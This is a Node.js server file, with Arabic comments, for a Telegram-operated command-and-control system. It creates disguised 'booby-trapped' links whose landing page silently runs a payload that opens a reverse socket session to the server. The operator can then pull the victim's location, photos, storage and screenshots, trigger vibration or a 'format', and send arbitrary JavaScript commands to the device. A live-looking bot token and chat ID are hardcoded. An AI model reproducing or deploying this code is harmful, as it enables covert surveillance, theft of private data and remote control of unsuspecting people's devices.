const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const sharp = require('sharp');
const { Server: SocketIO } = require('socket.io');
const AdvancedPayloadSystem = require('./payload-system');

// 🔧 إعدادات البوت - تأكد من صحتها
const token = '8407389383:AAFkWGHIUTYoWnaSNhCUEeEl_AijkwNN308';
const id = '6565594143';
// غير هذا الرابط برابط استضافتك الفعلي
const SERVER_URL = process.env.SERVER_URL || 'https://your-app.vercel.app';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const io = new SocketIO(appServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const appBot = new telegramBot(token, { 
  polling: true,
  request: {
    agentOptions: {
      keepAlive: true
    }
  }
});

// تخزين البيانات
const appClients = new Map();
const reverseSessions = new Map();
const infectedImages = new Map();
const infectedLinks = new Map();
const payloadSystem = new AdvancedPayloadSystem();

// إعدادات middleware
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({
  limit: '50mb',
  extended: true
}));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

// ========== نظام الجلسات العكسية المتقدم ==========
io.on('connection', (socket) => {
  console.log('🔌 اتصال عكسي جديد:', socket.id);

  socket.on('reverse_connect', async (data) => {
    const { device_id, link_id, payload_id, platform, userAgent, url, ip, device_info } = data;
    
    console.log(`🎯 جلسة عكسية جديدة من: ${device_id}`);
    
    const sessionData = {
      socket: socket,
      device_id: device_id,
      link_id: link_id,
      payload_id: payload_id,
      platform: platform,
      userAgent: userAgent,
      url: url,
      ip: ip,
      device_info: device_info,
      connected: true,
      connected_at: new Date()
    };

    // حفظ في الذاكرة
    reverseSessions.set(device_id, sessionData);
    payloadSystem.registerSession(device_id, sessionData);

    // إرسال إشعار للتليجرام
    await appBot.sendMessage(
      id,
      `🦠 جلسة عكسية جديدة!\n\n` +
      `📱 الجهاز: <code>${device_id}</code>\n` +
      `🔗 الرابط: ${link_id || 'N/A'}\n` +
      `💻 النظام: ${platform}\n` +
      `🌐 المتصفح: ${userAgent}\n` +
      `🔗 الصفحة: ${url}\n` +
      `📍 الأيبي: ${ip || 'مخفي'}\n\n` +
      `✅ الجلسة جاهزة للتحكم الكامل`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ التحكم في الجهاز", callback_data: `control:${device_id}` },
              { text: "📊 معلومات الجهاز", callback_data: `info:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('command_result', (data) => {
    const { device_id, command, result } = data;
    
    let displayResult = result;
    if (result && result.length > 3000) {
      displayResult = result.substring(0, 3000) + '\n\n... [تم تقصير الناتج]';
    }
    
    appBot.sendMessage(
      id,
      `📤 نتيجة الأمر من ${device_id}:\n\n` +
      `💻 الأمر: <code>${command}</code>\n` +
      `📊 الناتج:\n<pre>${displayResult || 'لا يوجد ناتج'}</pre>`,
      { 
        parse_mode: "HTML"
      }
    );
  });

  socket.on('disconnect', () => {
    for (let [device_id, session] of reverseSessions) {
      if (session.socket === socket) {
        console.log(`🔌 انتهت الجلسة: ${device_id}`);
        reverseSessions.delete(device_id);
        
        appBot.sendMessage(
          id,
          `🔌 انتهت الجلسة العكسية\n📱 الجهاز: ${device_id}`,
          { parse_mode: "HTML" }
        );
        break;
      }
    }
  });
});

// ========== نظام تلغيم الروابط ==========

// 🔗 دالة لإنشاء رابط ملغم
function createInfectedLink() {
    const linkId = uuidv4();
    const payloadResult = payloadSystem.createAdvancedLinkPayload(linkId, SERVER_URL);
    const payloadId = payloadResult.payloadId;
    
    const infectedLink = {
        linkId: linkId,
        payloadId: payloadId,
        payloadCode: payloadResult.code,
        createdAt: new Date(),
        url: `${SERVER_URL}/link/${payloadId}`
    };
    
    infectedLinks.set(linkId, infectedLink);
    infectedLinks.set(payloadId, infectedLink);
    
    return infectedLink;
}

// ========== واجهة البوت ==========

// 🎯 معالجة الضغط على الأزرار
appBot.on("callback_query", async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = message.chat.id;
    
    console.log('🔄 تم الضغط على زر:', data);
    
    try {
        if (data === 'create_link') {
            await appBot.answerCallbackQuery(callbackQuery.id, { 
                text: "⏳ جاري صنع الرابط الملغم..." 
            });
            
            // إنشاء رابط ملغم
            const infectedLink = createInfectedLink();
            
            await appBot.sendMessage(
                chatId,
                `🔗 رابط ملغم جاهز!\n\n` +
                `🆔 المعرف: <code>${infectedLink.linkId}</code>\n` +
                `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                `🌐 الرابط:\n<code>${infectedLink.url}</code>\n\n` +
                `🚀 الميزات:\n` +
                `• ✅ يعمل في جميع المتصفحات\n` +
                `• 📍 تحديد الموقع الدقيق\n` +
                `• 📳 تشغيل الاهتزاز\n` +
                `• 🖼️ سحب الصور والملفات\n` +
                `• 📱 معلومات الجهاز الكاملة\n\n` +
                `🎯 عندما يفتح أي شخص هذا الرابط:\n` +
                `• سيفتح اتصال عكسي تلقائياً\n` +
                `• ستظهر جلسته في "الأجهزة المتصلة"\n` +
                `• يمكنك التحكم الكامل في جهازه\n\n` +
                `🔗 شارك هذا الرابط لفتح جلسات جديدة!`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { 
                                    text: "🔗 نسخ الرابط", 
                                    callback_data: `copy:${infectedLink.payloadId}` 
                                },
                                { 
                                    text: "📱 الأجهزة المتصلة", 
                                    callback_data: "sessions" 
                                }
                            ],
                            [
                                { 
                                    text: "🔄 صنع رابط آخر", 
                                    callback_data: "create_link" 
                                }
                            ]
                        ]
                    }
                }
            );
        }
        else if (data.startsWith('copy:')) {
            const payloadId = data.split(':')[1];
            let link = '';
            
            if (infectedLinks.has(payloadId)) {
                link = infectedLinks.get(payloadId).url;
            }
            
            if (link) {
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: `✅ تم نسخ الرابط` 
                });
                
                await appBot.sendMessage(
                    chatId,
                    `🔗 الرابط الملغم:\n\n<code>${link}</code>\n\n` +
                    `🎯 شارك هذا الرابط لفتح جلسات جديدة!`,
                    { parse_mode: "HTML" }
                );
            }
        }
        else if (data === 'sessions') {
            const activeSessions = Array.from(reverseSessions.keys());
            
            if (activeSessions.length === 0) {
                await appBot.sendMessage(chatId, '📭 لا توجد أجهزة متصلة حالياً');
            } else {
                let sessionsText = `📱 الأجهزة المتصلة: ${activeSessions.length}\n\n`;
                
                activeSessions.forEach(deviceId => {
                    const session = reverseSessions.get(deviceId);
                    const duration = Math.round((new Date() - session.connected_at) / 1000);
                    
                    sessionsText += `📱 <code>${deviceId}</code>\n` +
                                 `💻 ${session.platform}\n` +
                                 `⏰ ${duration} ثانية\n\n`;
                });
                
                await appBot.sendMessage(
                    chatId, 
                    sessionsText,
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "🔄 تحديث", callback_data: "sessions" }
                                ]
                            ]
                        }
                    }
                );
            }
        }
        else if (data.startsWith('control:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `🎯 التحكم في الجهاز: <code>${deviceId}</code>\n\n` +
                `اختر الأمر المطلوب:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "📍 الموقع", callback_data: `location:${deviceId}` },
                                { text: "📳 الاهتزاز", callback_data: `vibrate:${deviceId}` }
                            ],
                            [
                                { text: "🔋 البطارية", callback_data: `battery:${deviceId}` },
                                { text: "🖼️ الصور", callback_data: `photos:${deviceId}` }
                            ],
                            [
                                { text: "📊 المعلومات", callback_data: `info:${deviceId}` },
                                { text: "💾 التخزين", callback_data: `storage:${deviceId}` }
                            ],
                            [
                                { text: "📸 لقطة شاشة", callback_data: `screenshot:${deviceId}` },
                                { text: "🔄 فرمتة", callback_data: `format:${deviceId}` }
                            ],
                            [
                                { text: "⚡ أمر مخصص", callback_data: `custom:${deviceId}` },
                                { text: "🔙 رجوع", callback_data: "sessions" }
                            ]
                        ]
                    }
                }
            );
        }
        else if (data.startsWith('location:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الموقع'
                });
                
                await appBot.sendMessage(chatId, `📍 جاري تحديد موقع الجهاز...`);
            }
        }
        else if (data.startsWith('vibrate:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'اهتزاز'
                });
                
                await appBot.sendMessage(chatId, `📳 جاري تشغيل الاهتزاز...`);
            }
        }
        else if (data.startsWith('battery:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'البطارية'
                });
                
                await appBot.sendMessage(chatId, `🔋 جاري قراءة حالة البطارية...`);
            }
        }
        else if (data.startsWith('photos:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الصور'
                });
                
                await appBot.sendMessage(chatId, `🖼️ جاري سحب الصور...`);
            }
        }
        else if (data.startsWith('info:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'معلومات'
                });
                
                await appBot.sendMessage(chatId, `📊 جاري جمع معلومات الجهاز...`);
            }
        }
        else if (data.startsWith('storage:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'التخزين'
                });
                
                await appBot.sendMessage(chatId, `💾 جاري قراءة التخزين...`);
            }
        }
        else if (data.startsWith('screenshot:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'لقطة'
                });
                
                await appBot.sendMessage(chatId, `📸 جاري أخذ لقطة الشاشة...`);
            }
        }
        else if (data.startsWith('format:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'فرمتة'
                });
                
                await appBot.sendMessage(chatId, `🔄 جاري محاكاة الفرمتة...`);
            }
        }
        else if (data.startsWith('custom:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `⚡ أدخل الأمر المخصص للجهاز <code>${deviceId}</code>:\n\n` +
                `مثال: <code>js:alert('hello')</code>\n\n` +
                `أدخل الأمر الآن:`,
                {
                    parse_mode: "HTML",
                    reply_markup: { force_reply: true }
                }
            );
            
            infectedImages.set('pending_command', { deviceId: deviceId });
        }

    } catch (error) {
        console.error('❌ خطأ في المعالجة:', error);
        await appBot.answerCallbackQuery(callbackQuery.id, { 
            text: "❌ حدث خطأ أثناء المعالجة" 
        });
    }
});

// 📨 معالجة الردود على الأوامر
appBot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // التحقق من صلاحية المستخدم
    if (String(chatId) !== String(id)) {
        await appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
        return;
    }

    // معالجة الردود على الأوامر
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text;
        
        if (replyText.includes('أدخل الأمر المخصص')) {
            const command = text;
            
            if (infectedImages.has('pending_command')) {
                const pending = infectedImages.get('pending_command');
                const deviceId = pending.deviceId;
                
                if (reverseSessions.has(deviceId)) {
                    const session = reverseSessions.get(deviceId);
                    
                    session.socket.emit('command', {
                        device_id: deviceId,
                        command: command
                    });
                    
                    await appBot.sendMessage(chatId, `✅ تم إرسال الأمر للجهاز: ${command}`);
                } else {
                    await appBot.sendMessage(chatId, `❌ الجلسة غير متصلة حالياً`);
                }
                
                infectedImages.delete('pending_command');
            }
        }
    }

    // الأوامر النصية
    if (text === '/start' || text === 'start') {
        const activeSessions = Array.from(reverseSessions.keys()).length;
        
        await appBot.sendMessage(
            chatId,
            `🎯 بوت الجلسات العكسية المتقدم\n\n` +
            `📊 الإحصائيات الحالية:\n` +
            `• 📱 الأجهزة المتصلة: ${activeSessions}\n` +
            `• 🔗 الروابط الملغمة: ${infectedLinks.size}\n\n` +
            `✨ الميزات:\n` +
            `• 🎯 تحكم كامل في الأجهزة\n` +
            `• 📍 تحديد الموقع الدقيق\n` +
            `• 📳 تشغيل الاهتزاز\n` +
            `• 🖼️ سحب الصور والملفات\n` +
            `• 🔋 معلومات البطارية\n` +
            `• 🔗 نظام تلغيم الروابط\n\n` +
            `🔧 اختر الإجراء المطلوب:`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "🔗 صنع رابط ملغم", callback_data: "create_link" },
                            { text: "📱 الأجهزة المتصلة", callback_data: "sessions" }
                        ]
                    ]
                }
            }
        );
    }
});

// ========== نظام البايلود الإضافي ==========

// 🌐 صفحة تشغيل البايلود للروابط
app.get('/link/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    
    if (!infectedLinks.has(payloadId)) {
        return res.status(404).send('الرابط غير موجود');
    }

    const linkData = infectedLinks.get(payloadId);
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>جاري التوجيه...</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                margin: 0;
                padding: 20px;
                font-family: Arial, sans-serif;
                background: #1a1a1a;
                color: white;
                text-align: center;
            }
            .container {
                max-width: 100%;
                margin: 0 auto;
            }
            .loading {
                font-size: 18px;
                margin: 20px 0;
                color: #58a6ff;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🔗 جاري التوجيه...</h2>
            <div class="loading">انتظر قليلاً...</div>
        </div>

        <script>
            // تشغيل البايلود فوراً
            ${linkData.payloadCode}
            
            // محاكاة التوجيه
            setTimeout(() => {
                document.querySelector('.loading').innerHTML = '✅ تم التوجيه بنجاح';
                document.body.innerHTML += '<p>📱 جاري الاتصال بالنظام...</p><p>⚡ جاهز للتحكم الكامل</p>';
            }, 1500);
        </script>
    </body>
    </html>
    `);
});

// 📡 endpoint للتتبع
app.get('/track/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    console.log('📱 Tracking activity from:', payloadId);
    res.send('');
});

// 🌐 الصفحة الرئيسية
app.get('/', (req, res) => {
    const activeSessions = Array.from(reverseSessions.keys()).length;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🦠 Advanced Reverse Bot</title>
        <meta charset="utf-8">
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 40px; 
                background: #0d1117; 
                color: #c9d1d9; 
                text-align: center;
            }
            .container { 
                max-width: 800px; 
                margin: 0 auto; 
            }
            .status { 
                background: #161b22; 
                padding: 20px; 
                border-radius: 10px; 
                margin: 20px 0; 
                border: 1px solid #30363d;
            }
            h1 { color: #58a6ff; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Advanced Reverse Bot</h1>
            <p>نظام التحكم الكامل عبر الروابط</p>
            
            <div class="status">
                <h2>📊 System Status</h2>
                <p>📱 الأجهزة المتصلة: ${activeSessions}</p>
                <p>🔗 الروابط الملغمة: ${infectedLinks.size}</p>
                <p>⏰ وقت التشغيل: ${Math.round(process.uptime())} ثانية</p>
                <p>🟢 الحالة: <strong>نشط ومستقر</strong></p>
            </div>
            
            <p>Bot is running successfully! 🎯</p>
            <p>Developer: @VIP_MFM</p>
        </div>
    </body>
    </html>
    `);
});

// 🚀 بدء السيرفر
const PORT = process.env.PORT || 3000;
appServer.listen(PORT, () => {
    console.log(`✅ البوت شغال على البورت: ${PORT}`);
    console.log(`🎯 نظام الجلسات العكسية المتقدم مفعل`);
    console.log(`🔗 السيرفر: ${SERVER_URL}`);
    console.log(`⚡ جاهز لصنع الروابط الملغمة!`);
    
    // تحذير مهم
    console.log('\n⚠️  IMPORTANT:');
    console.log('🔓 إذا كان الرابط يطلِع شاشة تسجيل دخول:');
    console.log('1. اذهب لإعدادات Vercel → General → Password Protection');
    console.log('2. أوقف Password Protection');
    console.log('3. أو استخدم استضافة أخرى مثل Railway أو Render');
});

// معالجة الأخطاء
process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled Rejection:', error);
});
